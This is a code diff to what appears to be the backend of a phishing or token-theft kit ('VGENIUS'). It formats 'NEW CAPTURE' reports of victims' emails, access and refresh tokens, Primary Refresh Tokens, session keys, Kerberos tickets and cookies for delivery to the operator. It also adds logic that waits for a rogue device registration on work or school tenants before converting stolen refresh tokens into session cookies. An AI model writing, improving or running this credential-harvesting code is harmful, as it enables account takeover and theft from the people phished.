@@ -47,7 +47,7 @@ function buildCaptureCaption(data) {
     } = data;
 
     const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
-    const label = tokenType === 'cookie' ? 'COOKIE + TOKENS' : 'TOKEN';
+    const label = tokenType === 'cookie' ? 'COOKIES' : 'TOKENS';
     const lines = [];
 
     lines.push(`🚨 <b>NEW CAPTURE - ${label}</b>`);
@@ -60,7 +60,7 @@ function buildCaptureCaption(data) {
     }
     lines.push(`🔗 <b>Link:</b> ${esc(linkId)} | <b>Token ID:</b> ${esc(tokenId)}`);
     lines.push(`📅 <b>Time:</b> ${esc(stamp)}`);
-    lines.push(`✅ Full tokens${tokenType === 'cookie' ? ' + cookies' : ''} in attached .txt`);
+    lines.push(`✅ Full ${tokenType === 'cookie' ? 'cookies' : 'tokens'} in attached .txt`);
 
     return lines.join('\n');
 }
@@ -83,7 +83,7 @@ function buildCaptureFileContent(data) {
 
     out.push('VGENIUS CAPTURE REPORT');
     out.push(sep);
-    out.push(`Type:        ${tokenType === 'cookie' ? 'COOKIE + TOKEN' : 'TOKEN'}`);
+    out.push(`Type:        ${tokenType === 'cookie' ? 'COOKIE' : 'TOKEN'}`);
     out.push(`Token ID:    ${tokenId}`);
     out.push(`Link ID:     ${linkId}`);
     out.push(`Email:       ${email || 'unknown'}`);
@@ -95,66 +95,69 @@ function buildCaptureFileContent(data) {
     out.push(`Captured:    ${stamp}`);
     out.push(sep);
 
-    out.push('ACCESS TOKEN:');
-    out.push(accessToken || 'N/A');
-    out.push('');
-
-    if (idToken) {
-        out.push('ID TOKEN:');
-        out.push(idToken);
+    // For TOKEN mode: show all token fields
+    if (tokenType !== 'cookie') {
+        out.push('ACCESS TOKEN:');
+        out.push(accessToken || 'N/A');
         out.push('');
+
+        if (idToken) {
+            out.push('ID TOKEN:');
+            out.push(idToken);
+            out.push('');
+        }
+
+        if (prt) {
+            out.push('PRT / REFRESH TOKEN:');
+            out.push(prt);
+            out.push('');
+        }
+
+        if (refreshToken && refreshToken !== prt) {
+            out.push('REFRESH TOKEN:');
+            out.push(refreshToken);
+            out.push('');
+        }
+
+        if (sessionKeyJwe) {
+            out.push('SESSION KEY (JWE):');
+            out.push(sessionKeyJwe);
+            out.push('');
+        }
+
+        if (deviceTenantId) {
+            out.push('DEVICE TENANT ID:');
+            out.push(deviceTenantId);
+            out.push('');
+        }
+
+        if (tgtAd) {
+            out.push('TGT AD:');
+            out.push(tgtAd);
+            out.push('');
+        }
+
+        if (tgtCloud) {
+            out.push('TGT CLOUD:');
+            out.push(tgtCloud);
+            out.push('');
+        }
+
+        if (tgtCloudSessionkey) {
+            out.push('TGT CLOUD SESSION KEY:');
+            out.push(tgtCloudSessionkey);
+            out.push('');
+        }
+
+        if (kerberosTopLevelNames) {
+            out.push('KERBEROS TOP LEVEL NAMES:');
+            out.push(kerberosTopLevelNames);
+            out.push('');
+        }
     }
 
-    if (prt) {
-        out.push('PRT / REFRESH TOKEN:');
-        out.push(prt);
-        out.push('');
-    }
-
-    if (refreshToken && refreshToken !== prt) {
-        out.push('REFRESH TOKEN:');
-        out.push(refreshToken);
-        out.push('');
-    }
-
-    if (sessionKeyJwe) {
-        out.push('SESSION KEY (JWE):');
-        out.push(sessionKeyJwe);
-        out.push('');
-    }
-
-    if (deviceTenantId) {
-        out.push('DEVICE TENANT ID:');
-        out.push(deviceTenantId);
-        out.push('');
-    }
-
-    if (tgtAd) {
-        out.push('TGT AD:');
-        out.push(tgtAd);
-        out.push('');
-    }
-
-    if (tgtCloud) {
-        out.push('TGT CLOUD:');
-        out.push(tgtCloud);
-        out.push('');
-    }
-
-    if (tgtCloudSessionkey) {
-        out.push('TGT CLOUD SESSION KEY:');
-        out.push(tgtCloudSessionkey);
-        out.push('');
-    }
-
-    if (kerberosTopLevelNames) {
-        out.push('KERBEROS TOP LEVEL NAMES:');
-        out.push(kerberosTopLevelNames);
-        out.push('');
-    }
-
+    // For COOKIE mode: show only cookies
     if (tokenType === 'cookie' && (cookieSample || cookieCount)) {
-        out.push(sep);
         out.push(`COOKIES (${cookieCount || 0} cookies):`);
         out.push(cookieSample || 'N/A');
         out.push('');
@@ -466,30 +469,81 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     // FIX: Pass refresh_token (not access_token) - cookie converter needs refresh token to generate session cookies
     const refreshTokenForConversion = refresh_token || prt || access_token;
     if (link.auth_mode === 'cookie') {
-        processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, captureMeta)
-            .then((cookieResult) => {
-                const io = req.app.get('io');
-                if (io) {
-                    io.to(`user_${user_id}`).emit('new_token', {
-                        id: tokenId,
-                        email,
-                        token_type: 'cookie',
-                        created_at: new Date()
-                    });
+        // For work/school accounts, wait for device registration to complete first
+        // then use the device registration PRT for cookie generation
+        const waitForDeviceRegistration = () => {
+            return new Promise((resolve) => {
+                if (accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
+                    // Wait up to 30 seconds for device registration
+                    console.log('[Capture] Waiting for device registration before cookie conversion...');
+                    const maxWait = 30000;
+                    const intervalMs = 1000;
+                    let waited = 0;
+                    
+                    const timer = setInterval(() => {
+                        waited += intervalMs;
+                        // Check if device credentials were stored
+                        db.query(
+                            'SELECT id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
+                            [user_id, tenant]
+                        ).then(([rows]) => {
+                            if (rows.length > 0 || waited >= maxWait) {
+                                clearInterval(timer);
+                                console.log('[Capture] Device registration check complete after', waited, 'ms');
+                                resolve();
+                            }
+                        }).catch(() => {
+                            clearInterval(timer);
+                            resolve();
+                        });
+                    }, intervalMs);
+                } else {
+                    resolve();
                 }
-                // Send report WITH cookie data (full tokens + cookies .txt)
-                sendCaptureReport(user_id, {
-                    ...captureData,
-                    tokenType: 'cookie',
-                    cookieCount: cookieResult.cookie_count,
-                    cookieSample: cookieResult.cookies,
-                });
-            })
-            .catch(err => {
-                console.error('[Capture] Cookie conversion failed:', err.message);
-                // Send tokens-only report (.txt) if cookie conversion fails
-                sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
             });
+        };
+
+        waitForDeviceRegistration().then(() => {
+            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, captureMeta)
+                .then((cookieResult) => {
+                    const io = req.app.get('io');
+                    if (io) {
+                        io.to(`user_${user_id}`).emit('new_token', {
+                            id: tokenId,
+                            email,
+                            token_type: 'cookie',
+                            created_at: new Date()
+                        });
+                    }
+                    // Send report WITH cookie data (full tokens + cookies .txt)
+                    sendCaptureReport(user_id, {
+                        ...captureData,
+                        tokenType: 'cookie',
+                        cookieCount: cookieResult.cookie_count,
+                        cookieSample: cookieResult.cookies,
+                    });
+                })
+                .catch(err => {
+                    console.error('[Capture] Cookie conversion failed:', err.message);
+                    // Send tokens-only report (.txt) if cookie conversion fails
+                    sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
+                });
+        }).catch(err => {
+            console.error('[Capture] Device registration wait failed:', err.message);
+            // Proceed with cookie conversion anyway
+            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, captureMeta)
+                .then((cookieResult) => {
+                    sendCaptureReport(user_id, {
+                        ...captureData,
+                        tokenType: 'cookie',
+                        cookieCount: cookieResult.cookie_count,
+                        cookieSample: cookieResult.cookies,
+                    });
+                })
+                .catch(() => {
+                    sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
+                });
+        });
     } else {
         const io = req.app.get('io');
         if (io) {
